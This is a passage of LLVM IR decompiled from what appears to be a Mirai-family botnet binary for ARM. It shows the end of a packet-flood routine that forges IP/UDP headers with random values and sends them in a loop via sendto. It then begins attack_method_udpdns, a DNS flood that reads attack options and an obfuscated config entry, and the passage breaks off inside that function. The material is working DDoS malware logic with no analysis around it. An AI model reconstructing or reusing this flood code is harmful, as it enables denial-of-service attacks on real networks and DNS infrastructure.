  %v2_a240 = load i8, i8* %v1_a240, align 1
  %tmp = urem i8 %v2_a240, 16
  %v1_a244 = zext i8 %tmp to i32
  %v1_a248 = or i32 %v1_a244, 64
  store i32 %v1_a248, i32* %r3.global-to-local, align 4
  %v1_a250 = trunc i32 %v1_a248 to i8
  store i8 %v1_a250, i8* %v1_a240, align 1
  %v0_a254 = load i32, i32* @lr, align 4
  %v1_a254 = inttoptr i32 %v0_a254 to i8*
  %v2_a254 = load i8, i8* %v1_a254, align 1
  %v1_a258 = and i8 %v2_a254, -16
  %v1_a25c = or i8 %v1_a258, 5
  store i8 %v1_a25c, i8* %v1_a254, align 1
  %v2_a268 = load i32, i32* @lr, align 4
  %v3_a268 = add i32 %v2_a268, 1
  %v4_a268 = inttoptr i32 %v3_a268 to i8*
  store i8 %v5_a0dc, i8* %v4_a268, align 1
  %v3_a26c = load i32, i32* %stack_var_-48, align 4
  %v3_a270 = mul i32 %v3_a26c, 65536
  %v1_a274 = add i32 %v3_a270, 2097152
  %v3_a278 = udiv i32 %v1_a274, 256
  %v4_a280 = udiv i32 %v1_a274, 16777216
  %v5_a280 = or i32 %v3_a278, %v4_a280
  %v3_a284 = urem i32 %v3_a26c, 65536
  store i32 %v3_a284, i32* %r2.global-to-local, align 4
  %v1_a288 = trunc i32 %v5_a280 to i16
  %v2_a288 = load i32, i32* @lr, align 4
  %v3_a288 = add i32 %v2_a288, 2
  %v4_a288 = inttoptr i32 %v3_a288 to i16*
  store i16 %v1_a288, i16* %v4_a288, align 2
  %v0_a28c = load i32, i32* %r2.global-to-local, align 4
  %v1_a28c = mul i32 %v0_a28c, 65536
  %v3_a294 = add i32 %v1_a28c, 786432
  store i32 %v3_a294, i32* %r2.global-to-local, align 4
  store i32 %v1_a124, i32* %ip.global-to-local, align 4
  %v2_a29c = load i32, i32* @lr, align 4
  %v3_a29c = add i32 %v2_a29c, 8
  %v4_a29c = inttoptr i32 %v3_a29c to i8*
  store i8 %v1_a29c, i8* %v4_a29c, align 1
  %v0_a2a0 = load i32, i32* %r2.global-to-local, align 4
  %v3_a2a0 = udiv i32 %v0_a2a0, 256
  %v1_a2a4 = and i32 %v3_a2a0, ptrtoint (i32* @global_var_ff00.32 to i32)
  %v0_a2a8 = load i32, i32* %ip.global-to-local, align 4
  %v2_a2a8 = icmp eq i32 %v0_a2a8, 0
  store i1 %v2_a2a8, i1* %cpsr_z.global-to-local, align 1
  %v4_a2ac = udiv i32 %v0_a2a0, 16777216
  %v5_a2ac = or i32 %v1_a2a4, %v4_a2ac
  store i32 %v5_a2ac, i32* %ip.global-to-local, align 4
  %v2_a2b4 = load i32, i32* @lr, align 4
  %v3_a2b4 = add i32 %v2_a2b4, 9
  %v4_a2b4 = inttoptr i32 %v3_a2b4 to i8*
  store i8 17, i8* %v4_a2b4, align 1
  store i32 ptrtoint (i32* @global_var_241f0.57 to i32), i32* %r3.global-to-local, align 4
  %v0_a2bc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a2bc, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_a218
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_a2c0 = load i32, i32* @lr, align 4
  %v4_a2c0 = add i32 %v3_a2c0, 6
  %v5_a2c0 = inttoptr i32 %v4_a2c0 to i16*
  store i16 64, i16* %v5_a2c0, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_a218, %bb
  %v2_a2c4 = load i32, i32* @global_var_241f0.57, align 4
  %v1_a2c8 = load i32, i32* @lr, align 4
  %v2_a2c8 = add i32 %v1_a2c8, 12
  %v3_a2c8 = inttoptr i32 %v2_a2c8 to i32*
  store i32 %v2_a2c4, i32* %v3_a2c8, align 4
  store i32 %v2_a234, i32* %r2.global-to-local, align 4
  %v1_a2d0 = add i32 %v2_a234, 16
  %v2_a2d0 = inttoptr i32 %v1_a2d0 to i32*
  %v3_a2d0 = load i32, i32* %v2_a2d0, align 4
  %v1_a2d4 = load i32, i32* @lr, align 4
  %v2_a2d4 = add i32 %v1_a2d4, 16
  %v3_a2d4 = inttoptr i32 %v2_a2d4 to i32*
  store i32 %v3_a2d0, i32* %v3_a2d4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_a2dc = load i32, i32* @lr, align 4
  %v1_a2dc = add i32 %v0_a2dc, 20
  store i32 %v1_a2dc, i32* %r4.global-to-local, align 4
  %v2_a2e0 = add i32 %v0_a2dc, 28
  %v3_a2e0 = inttoptr i32 %v2_a2e0 to i32*
  store i32 -1, i32* %v3_a2e0, align 4
  %v0_a2e4 = load i32, i32* @r5, align 4
  %v1_a2e4 = trunc i32 %v0_a2e4 to i16
  %v2_a2e4 = load i32, i32* @lr, align 4
  %v3_a2e4 = add i32 %v2_a2e4, 4
  %v4_a2e4 = inttoptr i32 %v3_a2e4 to i16*
  store i16 %v1_a2e4, i16* %v4_a2e4, align 2
  %v0_a2e8 = load i32, i32* @lr, align 4
  %v1_a2e8 = add i32 %v0_a2e8, 32
  %v0_a2ec = load i32, i32* %ip.global-to-local, align 4
  %v1_a2ec = trunc i32 %v0_a2ec to i16
  %v2_a2ec = load i32, i32* %r4.global-to-local, align 4
  %v3_a2ec = add i32 %v2_a2ec, 4
  %v4_a2ec = inttoptr i32 %v3_a2ec to i16*
  store i16 %v1_a2ec, i16* %v4_a2ec, align 2
  %v0_a2f0 = load i32, i32* @r7, align 4
  %v1_a2f0 = trunc i32 %v0_a2f0 to i16
  %v2_a2f0 = load i32, i32* %r4.global-to-local, align 4
  %v3_a2f0 = add i32 %v2_a2f0, 2
  %v4_a2f0 = inttoptr i32 %v3_a2f0 to i16*
  store i16 %v1_a2f0, i16* %v4_a2f0, align 2
  %v0_a2f4 = load i32, i32* @r6, align 4
  %v1_a2f4 = trunc i32 %v0_a2f4 to i16
  %v2_a2f4 = load i32, i32* @lr, align 4
  %v3_a2f4 = add i32 %v2_a2f4, 20
  %v4_a2f4 = inttoptr i32 %v3_a2f4 to i16*
  store i16 %v1_a2f4, i16* %v4_a2f4, align 2
  %v3_a2f8 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_a2f8, i32* %r2.global-to-local, align 4
  %v3_a2fc = call i32 @util_memcpy(i32 %v1_a2e8, i32 %v3_a170, i32 %v3_a2f8)
  %v3_a300 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a300, i32* %r3.global-to-local, align 4
  %v1_a304 = add i32 %v3_a300, 1
  store i32 %v1_a304, i32* @r4, align 4
  %v1_a308 = load i32, i32* @r8, align 4
  %v9_a308 = icmp eq i32 %v1_a304, %v1_a308
  store i1 %v9_a308, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a304, i32* %stack_var_-44, align 4
  %v5_a310 = icmp slt i32 %v1_a304, %v1_a308
  br i1 %v5_a310, label %dec_label_pc_a218, label %dec_label_pc_a314.preheader

dec_label_pc_a314.preheader:                      ; preds = %.thread, %dec_label_pc_a1bc
  %v0_a318.ph = phi i32 [ 0, %dec_label_pc_a1bc ], [ %v1_a308, %.thread ]
  %v3_a354 = icmp eq i32 %v3_a1cc, 65535
  br label %dec_label_pc_a314

dec_label_pc_a314:                                ; preds = %dec_label_pc_a314, %dec_label_pc_a400, %dec_label_pc_a314.preheader
  %v0_a318 = phi i32 [ %v0_a318.ph, %dec_label_pc_a314.preheader ], [ 0, %dec_label_pc_a400 ], [ 0, %dec_label_pc_a314 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a318 = icmp eq i32 %v0_a318, 0
  store i1 %v2_a318, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a318, label %dec_label_pc_a314, label %dec_label_pc_a324

dec_label_pc_a324:                                ; preds = %dec_label_pc_a314, %dec_label_pc_a400
  br label %dec_label_pc_a328

dec_label_pc_a328:                                ; preds = %dec_label_pc_a374, %dec_label_pc_a324
  %v1_a338 = phi i32 [ %v1_a3f0, %dec_label_pc_a374 ], [ 0, %dec_label_pc_a324 ]
  %v5_a32c = mul i32 %v1_a338, 24
  %v1_a330 = load i32, i32* @sl, align 4
  %v2_a330 = add i32 %v1_a330, %v5_a32c
  store i32 %v2_a330, i32* %r3.global-to-local, align 4
  %v1_a334 = add i32 %v2_a330, 20
  %v2_a334 = inttoptr i32 %v1_a334 to i8*
  %v3_a334 = load i8, i8* %v2_a334, align 1
  %v4_a334 = zext i8 %v3_a334 to i32
  store i32 %v4_a334, i32* %r2.global-to-local, align 4
  %v0_a338 = load i32, i32* @fp, align 4
  %v4_a338 = mul i32 %v1_a338, 4
  %v5_a338 = add i32 %v0_a338, %v4_a338
  %v6_a338 = inttoptr i32 %v5_a338 to i32*
  %v7_a338 = load i32, i32* %v6_a338, align 4
  store i32 %v7_a338, i32* @r5, align 4
  %v7_a340 = icmp eq i8 %v3_a334, 31
  store i1 %v7_a340, i1* %cpsr_z.global-to-local, align 1
  store i32 65535, i32* @r7, align 4
  %v1_a348 = add i32 %v7_a338, 20
  store i32 %v1_a348, i32* @r6, align 4
  %tmp40 = icmp ult i8 %v3_a334, 32
  br i1 %tmp40, label %dec_label_pc_a414, label %dec_label_pc_a350

dec_label_pc_a350:                                ; preds = %dec_label_pc_a328
  store i32 %v3_a1cc, i32* %r3.global-to-local, align 4
  store i1 %v3_a354, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a354, label %dec_label_pc_a474, label %dec_label_pc_a35c

dec_label_pc_a35c:                                ; preds = %dec_label_pc_a414, %dec_label_pc_a350
  %v1_a360 = phi i32 [ %v1_a46c, %dec_label_pc_a414 ], [ 65535, %dec_label_pc_a350 ]
  store i32 %v3_a1d0, i32* %ip.global-to-local, align 4
  %v9_a360 = icmp eq i32 %v3_a1d0, %v1_a360
  store i1 %v9_a360, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a360, label %dec_label_pc_a488, label %dec_label_pc_a368

dec_label_pc_a368:                                ; preds = %dec_label_pc_a474.dec_label_pc_a368_crit_edge, %dec_label_pc_a35c
  %v1_a36c = phi i32 [ %v1_a36c.pre, %dec_label_pc_a474.dec_label_pc_a368_crit_edge ], [ %v1_a360, %dec_label_pc_a35c ]
  %v9_a36c = icmp eq i32 %v3_a1d4, %v1_a36c
  store i1 %v9_a36c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a36c, label %dec_label_pc_a49c, label %dec_label_pc_a374

dec_label_pc_a374:                                ; preds = %dec_label_pc_a488, %dec_label_pc_a368, %dec_label_pc_a49c
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_a378 = load i32, i32* @r5, align 4
  %v3_a378 = add i32 %v2_a378, 10
  %v4_a378 = inttoptr i32 %v3_a378 to i16*
  store i16 0, i16* %v4_a378, align 2
  %v0_a380 = load i32, i32* @r5, align 4
  store i32 %v0_a380, i32* @r0, align 4
  %v2_a384 = call i32 @checksum_generic(i32 %v0_a380, i32 20)
  %v3_a384 = trunc i32 %v2_a384 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_a38c = load i32, i32* @r5, align 4
  %v4_a38c = add i32 %v3_a38c, 10
  %v5_a38c = inttoptr i32 %v4_a38c to i16*
  store i16 %v3_a384, i16* %v5_a38c, align 2
  %v0_a390 = load i32, i32* %r3.global-to-local, align 4
  %v1_a390 = trunc i32 %v0_a390 to i16
  %v2_a390 = load i32, i32* @r6, align 4
  %v3_a390 = add i32 %v2_a390, 6
  %v4_a390 = inttoptr i32 %v3_a390 to i16*
  store i16 %v1_a390, i16* %v4_a390, align 2
  %v3_a394 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_a394, i32* %r3.global-to-local, align 4
  %v0_a398 = load i32, i32* @r6, align 4
  store i32 %v0_a398, i32* @r1, align 4
  %v1_a39c = add i32 %v0_a398, 4
  %v2_a39c = inttoptr i32 %v1_a39c to i16*
  %v3_a39c = load i16, i16* %v2_a39c, align 2
  %v4_a39c = zext i16 %v3_a39c to i32
  store i32 %v4_a39c, i32* %r2.global-to-local, align 4
  %v1_a3a0 = add i32 %v3_a394, 12
  store i32 %v1_a3a0, i32* %r3.global-to-local, align 4
  %v0_a3a4 = load i32, i32* @r5, align 4
  %v4_a3a8 = call i32 @checksum_tcpudp(i32 %v0_a3a4, i32 %v0_a398, i32 %v4_a39c, i32 %v1_a3a0)
  %v5_a3a8 = trunc i32 %v4_a3a8 to i16
  %v3_a3ac = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a3ac, i32* %r3.global-to-local, align 4
  %v3_a3b0 = mul i32 %v3_a3ac, 32
  store i32 %v3_a3b0, i32* %lr.global-to-local, align 4
  %v3_a3b4 = load i32, i32* @r6, align 4
  %v4_a3b4 = add i32 %v3_a3b4, 6
  %v5_a3b4 = inttoptr i32 %v4_a3b4 to i16*
  store i16 %v5_a3a8, i16* %v5_a3b4, align 2
  %v0_a3b8 = load i32, i32* %lr.global-to-local, align 4
  %v1_a3b8 = load i32, i32* %r3.global-to-local, align 4
  %tmp41 = mul i32 %v1_a3b8, -8
  %v5_a3b8 = add i32 %v0_a3b8, %tmp41
  store i32 %v5_a3b8, i32* %lr.global-to-local, align 4
  %v0_a3bc = load i32, i32* @r6, align 4
  %v1_a3bc = add i32 %v0_a3bc, 2
  %v2_a3bc = inttoptr i32 %v1_a3bc to i16*
  %v3_a3bc = load i16, i16* %v2_a3bc, align 2
  %v4_a3bc = zext i16 %v3_a3bc to i32
  store i32 %v4_a3bc, i32* @r6, align 4
  %v3_a3c0 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_a3c0, i32* %r2.global-to-local, align 4
  %v1_a3c4 = load i32, i32* @sl, align 4
  %v2_a3c4 = add i32 %v1_a3c4, %v5_a3b8
  store i32 %v2_a3c4, i32* @lr, align 4
  %v3_a3c8 = add i32 %v2_a3c4, 2
  %v4_a3c8 = inttoptr i32 %v3_a3c8 to i16*
  store i16 %v3_a3bc, i16* %v4_a3c8, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_a3d4 = load i32, i32* @r5, align 4
  %v0_a3d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_a3d8 = add i32 %v0_a3d8, 32
  store i32 %v1_a3d8, i32* %r2.global-to-local, align 4
  %v0_a3dc = load i32, i32* @sb, align 4
  %v0_a3e0 = load i32, i32* @lr, align 4
  %v6_a3e8 = call i32 @__libc_sendto(i32 %v0_a3dc, i32 %v0_a3d4, i32 %v1_a3d8, i32 16384, i32 %v0_a3e0, i32 16)
  %v3_a3ec = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a3ec, i32* %r3.global-to-local, align 4
  %v1_a3f0 = add i32 %v3_a3ec, 1
  %v1_a3f4 = load i32, i32* @r8, align 4
  %v9_a3f4 = icmp eq i32 %v1_a3f0, %v1_a3f4
  store i1 %v9_a3f4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a3f0, i32* %stack_var_-44, align 4
  %v5_a3fc = icmp slt i32 %v1_a3f0, %v1_a3f4
  br i1 %v5_a3fc, label %dec_label_pc_a328, label %dec_label_pc_a400

dec_label_pc_a400:                                ; preds = %dec_label_pc_a374
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a404 = icmp eq i32 %v1_a3f4, 0
  store i1 %v2_a404, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a404, label %dec_label_pc_a314, label %dec_label_pc_a324

dec_label_pc_a414:                                ; preds = %dec_label_pc_a328
  %v1_a414 = add i32 %v2_a330, 16
  %v2_a414 = inttoptr i32 %v1_a414 to i32*
  %v3_a414 = load i32, i32* %v2_a414, align 4
  store i32 %v3_a414, i32* @r4, align 4
  %v0_a418 = call i32 @rand_next()
  %v3_a41c = load i32, i32* %stack_var_-44, align 4
  %v5_a424 = mul i32 %v3_a41c, 24
  %v0_a428 = load i32, i32* @r4, align 4
  %v1_a428 = and i32 %v0_a428, 16711680
  store i32 %v1_a428, i32* %ip.global-to-local, align 4
  %v3_a42c = udiv i32 %v0_a428, 16777216
  %v4_a430 = udiv i32 %v1_a428, 256
  %v5_a430 = or i32 %v4_a430, %v3_a42c
  store i32 %v5_a430, i32* %r2.global-to-local, align 4
  %v1_a434 = load i32, i32* @sl, align 4
  %v2_a434 = add i32 %v1_a434, %v5_a424
  %v1_a438 = and i32 %v0_a428, ptrtoint (i32* @global_var_ff00.32 to i32)
  store i32 %v1_a438, i32* %r3.global-to-local, align 4
  %v1_a43c = add i32 %v2_a434, 20
  %v2_a43c = inttoptr i32 %v1_a43c to i8*
  %v3_a43c = load i8, i8* %v2_a43c, align 1
  %v4_a43c = zext i8 %v3_a43c to i32
  store i32 %v4_a43c, i32* %ip.global-to-local, align 4
  %v4_a440 = mul i32 %v1_a438, 256
  %v4_a444 = mul i32 %v0_a428, 16777216
  %v5_a440 = or i32 %v4_a440, %v4_a444
  %v5_a444 = or i32 %v5_a440, %v5_a430
  %v7_a448 = lshr i32 %v0_a418, %v4_a43c
  %v8_a448 = add i32 %v7_a448, %v5_a444
  store i32 %v8_a448, i32* %r2.global-to-local, align 4
  %v5_a460 = call i32 @llvm.bswap.i32(i32 %v8_a448)
  %v1_a464 = load i32, i32* @r5, align 4
  %v2_a464 = add i32 %v1_a464, 16
  %v3_a464 = inttoptr i32 %v2_a464 to i32*
  store i32 %v5_a460, i32* %v3_a464, align 4
  store i32 %v3_a1cc, i32* %r3.global-to-local, align 4
  %v1_a46c = load i32, i32* @r7, align 4
  %v9_a46c = icmp eq i32 %v3_a1cc, %v1_a46c
  store i1 %v9_a46c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a46c, label %dec_label_pc_a474, label %dec_label_pc_a35c

dec_label_pc_a474:                                ; preds = %dec_label_pc_a414, %dec_label_pc_a350
  %v0_a474 = call i32 @rand_next()
  %v1_a474 = trunc i32 %v0_a474 to i16
  store i32 %v3_a1d0, i32* %ip.global-to-local, align 4
  %v1_a47c = load i32, i32* @r7, align 4
  %v9_a47c = icmp eq i32 %v3_a1d0, %v1_a47c
  store i1 %v9_a47c, i1* %cpsr_z.global-to-local, align 1
  %v3_a480 = load i32, i32* @r5, align 4
  %v4_a480 = add i32 %v3_a480, 4
  %v5_a480 = inttoptr i32 %v4_a480 to i16*
  store i16 %v1_a474, i16* %v5_a480, align 2
  br i1 %v9_a47c, label %dec_label_pc_a488, label %dec_label_pc_a474.dec_label_pc_a368_crit_edge

dec_label_pc_a474.dec_label_pc_a368_crit_edge:    ; preds = %dec_label_pc_a474
  %v1_a36c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_a368

dec_label_pc_a488:                                ; preds = %dec_label_pc_a474, %dec_label_pc_a35c
  %v0_a488 = call i32 @rand_next()
  %v1_a488 = trunc i32 %v0_a488 to i16
  %v1_a490 = load i32, i32* @r7, align 4
  %v9_a490 = icmp eq i32 %v3_a1d4, %v1_a490
  store i1 %v9_a490, i1* %cpsr_z.global-to-local, align 1
  %v3_a494 = load i32, i32* @r5, align 4
  %v4_a494 = add i32 %v3_a494, 20
  %v5_a494 = inttoptr i32 %v4_a494 to i16*
  store i16 %v1_a488, i16* %v5_a494, align 2
  br i1 %v9_a490, label %dec_label_pc_a49c, label %dec_label_pc_a374

dec_label_pc_a49c:                                ; preds = %dec_label_pc_a488, %dec_label_pc_a368
  %v0_a49c = call i32 @rand_next()
  %v1_a49c = trunc i32 %v0_a49c to i16
  %v3_a4a0 = load i32, i32* @r6, align 4
  %v4_a4a0 = add i32 %v3_a4a0, 2
  %v5_a4a0 = inttoptr i32 %v4_a4a0 to i16*
  store i16 %v1_a49c, i16* %v5_a4a0, align 2
  br label %dec_label_pc_a374

dec_label_pc_a4a8:                                ; preds = %dec_label_pc_a194
  %v0_a4a8 = load i32, i32* @sb, align 4
  %v1_a4ac = call i32 @__GI___libc_close(i32 %v0_a4a8)
  br label %dec_label_pc_a4b0

dec_label_pc_a4b0:                                ; preds = %entry, %dec_label_pc_a4a8
  %v1_a4b8 = phi i32 [ %v3_a184, %entry ], [ %v1_a4ac, %dec_label_pc_a4a8 ]
  store i32 %v3_a088, i32* %r4.global-to-local, align 4
  store i32 %v27_a088, i32* %lr.global-to-local, align 4
  ret i32 %v1_a4b8

; uselistorder directives
  uselistorder i32 %v1_a46c, { 1, 0 }
  uselistorder i32 %v0_a428, { 0, 2, 1, 3 }
  uselistorder i32 %v1_a3f0, { 2, 0, 3, 1 }
  uselistorder i32 %v5_a3b8, { 1, 0 }
  uselistorder i1 %v3_a354, { 1, 0 }
  uselistorder i32 %v1_a304, { 1, 0, 2, 3 }
  uselistorder i32 %v3_a26c, { 1, 0 }
  uselistorder i32 %v3_a204, { 1, 0 }
  uselistorder i32 %v3_a200, { 1, 0 }
  uselistorder i32 %v0_a1c4, { 1, 0, 3, 2 }
  uselistorder i32 %v0_a1c0, { 1, 0, 2 }
  uselistorder i32 %v0_a1bc, { 1, 0, 3, 2 }
  uselistorder i1 %v7_a1b4, { 1, 0 }
  uselistorder i1 %v7_a188, { 1, 0 }
  uselistorder i32 %v3_a184, { 1, 2, 3, 0 }
  uselistorder i32 %v1_a124, { 1, 0 }
  uselistorder i32 %v5_a0f8, { 1, 0 }
  uselistorder i32 %v5_a0bc, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_a4b0, { 1, 0 }
  uselistorder label %dec_label_pc_a374, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a324, { 1, 0 }
  uselistorder label %dec_label_pc_a314, { 1, 0, 2 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_method_udpdns(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-2124 = alloca i32, align 4
  %v18_a4c0 = load i32, i32* @sb, align 4
  %v27_a4c0 = load i32, i32* @lr, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_a4e0 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_a4e4 = load i32, i32* @r5, align 4
  store i32 %v0_a4e4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_a4f0 = load i32, i32* @r4, align 4
  store i32 %v0_a4f0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_a4f8 = inttoptr i32 %v0_a4e4 to i32*
  %v6_a4f8 = call i32 @attack_get_opt_int(i32 %v0_a4f0, i32* %v5_a4f8, i32 2, i32 0)
  %v1_a504 = urem i32 %v6_a4f8, 256
  store i32 %v1_a504, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a510 = load i32, i32* @r4, align 4
  store i32 %v0_a510, i32* %r0.global-to-local, align 4
  %v0_a514 = load i32, i32* @r5, align 4
  store i32 %v0_a514, i32* %r1.global-to-local, align 4
  %v6_a51c = inttoptr i32 %v0_a514 to i32*
  %v7_a51c = call i32 @attack_get_opt_int(i32 %v0_a510, i32* %v6_a51c, i32 3, i32 65535)
  %v0_a520 = load i32, i32* @r5, align 4
  store i32 %v0_a520, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_a52c = load i32, i32* @r4, align 4
  store i32 %v0_a52c, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v5_a534 = inttoptr i32 %v0_a520 to i32*
  %v6_a534 = call i32 @attack_get_opt_int(i32 %v0_a52c, i32* %v5_a534, i32 4, i32 64)
  %v1_a53c = urem i32 %v6_a534, 256
  store i32 %v1_a53c, i32* %ip.global-to-local, align 4
  %v0_a540 = load i32, i32* @r5, align 4
  store i32 %v0_a540, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a54c = load i32, i32* @r4, align 4
  store i32 %v0_a54c, i32* %r0.global-to-local, align 4
  %v6_a554 = inttoptr i32 %v0_a540 to i32*
  %v7_a554 = call i32 @attack_get_opt_int(i32 %v0_a54c, i32* %v6_a554, i32 5, i32 0)
  %v1_a560 = urem i32 %v7_a554, 256
  store i32 %v1_a560, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_a56c = load i32, i32* @r4, align 4
  store i32 %v0_a56c, i32* %r0.global-to-local, align 4
  %v0_a570 = load i32, i32* @r5, align 4
  store i32 %v0_a570, i32* %r1.global-to-local, align 4
  %v5_a578 = inttoptr i32 %v0_a570 to i32*
  %v6_a578 = call i32 @attack_get_opt_int(i32 %v0_a56c, i32* %v5_a578, i32 6, i32 65535)
  %v0_a57c = load i32, i32* @r5, align 4
  store i32 %v0_a57c, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_a588 = load i32, i32* @r4, align 4
  store i32 %v0_a588, i32* %r0.global-to-local, align 4
  store i32 53, i32* %r3.global-to-local, align 4
  %v5_a590 = inttoptr i32 %v0_a57c to i32*
  %v6_a590 = call i32 @attack_get_opt_int(i32 %v0_a588, i32* %v5_a590, i32 7, i32 53)
  %v0_a59c = load i32, i32* @r5, align 4
  store i32 %v0_a59c, i32* %r1.global-to-local, align 4
  %v0_a5a0 = load i32, i32* @r4, align 4
  store i32 %v0_a5a0, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_a5ac = inttoptr i32 %v0_a59c to i32*
  %v6_a5ac = call i32 @attack_get_opt_int(i32 %v0_a5a0, i32* %v5_a5ac, i32 9, i32 65535)
  %v0_a5b0 = load i32, i32* @r5, align 4
  store i32 %v0_a5b0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_a5bc = load i32, i32* @r4, align 4
  store i32 %v0_a5bc, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v5_a5c4 = inttoptr i32 %v0_a5b0 to i32*
  %v6_a5c4 = call i32 @attack_get_opt_int(i32 %v0_a5bc, i32* %v5_a5c4, i32 0, i32 12)
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a5d0 = load i32, i32* @r5, align 4
  store i32 %v0_a5d0, i32* %r1.global-to-local, align 4
  store i32 %v6_a5c4, i32* %sb.global-to-local, align 4
  %v0_a5d8 = load i32, i32* @r4, align 4
  store i32 %v0_a5d8, i32* %r0.global-to-local, align 4
  %v4_a5dc = inttoptr i32 %v0_a5d0 to i32*
  %v5_a5dc = call i32 @attack_get_opt_str(i32 %v0_a5d8, i32* %v4_a5dc, i32 8, i32 0)
  store i32 %v5_a5dc, i32* @r7, align 4
  store i32 21, i32* %r0.global-to-local, align 4
  %v1_a5e8 = call i32 @table_unlock_val(i32 21)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 21, i32* %r0.global-to-local, align 4
  %v3_a5f4 = call i32 @table_retrieve_val(i32 21, i32* null)
  store i32 %v3_a5f4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_a5fc = call i32 @__libc_open(i32 %v3_a5f4, i32 0)
  store i32 %v2_a5fc, i32* @r4, align 4
  store i32 21, i32* %r0.global-to-local, align 4
  %v1_a608 = call i32 @table_lock_val(i32 21)
  store i32 %v1_a608, i32* %r0.global-to-local, align 4
  %v0_a60c = load i32, i32* @r4, align 4
  %v1_a60c = icmp slt i32 %v0_a60c, 0
  %v2_a60c = icmp eq i32 %v0_a60c, 0
  store i1 %v2_a60c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_a60c, label %dec_label_pc_ab04, label %dec_label_pc_a614

dec_label_pc_a614:                                ; preds = %entry
  %v2_a618 = ptrtoint i32* %stack_var_-2124 to i32
  store i32 %v2_a618, i32* @sl, align 4
  store i32 2048, i32* @r2, align 4
  store i32 %v2_a618, i32* @r1, align 4
  store i32 %v0_a60c, i32* %r0.global-to-local, align 4
  %v1_a628 = call i32 @__libc_read(i32 %v0_a60c)
  store i32 %v1_a628, i32* @r5, align 4
  %v0_a630 = load i32, i32* @r4, align 4
  store i32 %v0_a630, i32* %r0.global-to-local, align 4
